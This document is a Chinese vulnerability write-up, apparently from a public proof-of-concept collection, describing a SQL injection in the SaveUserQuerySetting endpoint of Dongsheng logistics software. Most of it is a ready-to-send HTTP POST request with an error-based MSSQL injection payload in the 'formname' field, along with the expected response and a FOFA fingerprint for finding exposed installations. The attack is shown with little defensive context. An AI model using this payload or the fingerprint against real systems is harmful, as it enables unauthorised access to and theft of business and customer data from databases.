# 东胜物流软件SaveUserQuerySetting存在SQL注入漏洞

# 一、漏洞简介
东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。东胜物流软件 SaveUserQuerySetting接口处存在 SQL 注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 东胜物流软件

# 三、资产测绘
+ fofa`fid="Z4c2hPCi5IR/AnH5vZXNSQ=="`
+ 特征


# 四、漏洞复现
```plain
POST /MvcShipping/MsBaseInfo/SaveUserQuerySetting HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
Content-Length: 857
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

formname=MsRptSaleBalProfitShareIndex'+AND+2523+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(112)%2bCHAR(113)%2bCHAR(113)%2b(SELECT+SUBSTRING((ISNULL(CAST((+sys.fn_VarBinToHexStr(hashbytes('MD5','hello')))+AS+NVARCHAR(4000)),CHAR(32))),1,1024))%2bCHAR(113)%2bCHAR(122)%2bCHAR(107)%2bCHAR(113)%2bCHAR(113)))+AND+'uKco'%3d'uKco&isvisible=true&issavevalue=true&querydetail=%7B%22PS_MBLNO%22%3A%22%22%2C%22PS_VESSEL%22%3A%22%22%2C%22PS_VOYNO%22%3A%22%22%2C%22PS_SALE%22%3A%22%5Cu91d1%5Cu78ca%22%2C%22PS_OP%22%3Anull%2C%22PS_EXPDATEBGN%22%3A%222020-02-01%22%2C%22PS_EXPDATEEND%22%3A%222020-02-29%22%2C%22PS_STLDATEBGN%22%3A%22%22%2C%22PS_STLDATEEND%22%3A%22%22%2C%22PS_ACCDATEBGN%22%3A%22%22%2C%22PS_ACCDATEEND%22%3A%22%22%2C%22checkboxfield-1188-inputEl%22%3A%22on%22%2C%22PS_CUSTSERVICE%22%3Anull%2C%22PS_DOC%22%3Anull%2C%22hiddenfield-1206-inputEl%22%3A%22%22%7D}
```


```plain
qxpqq0x5d41402abc4b2a76b9719d911017c592qzkqq
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kmeubkhryrzmp90u>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
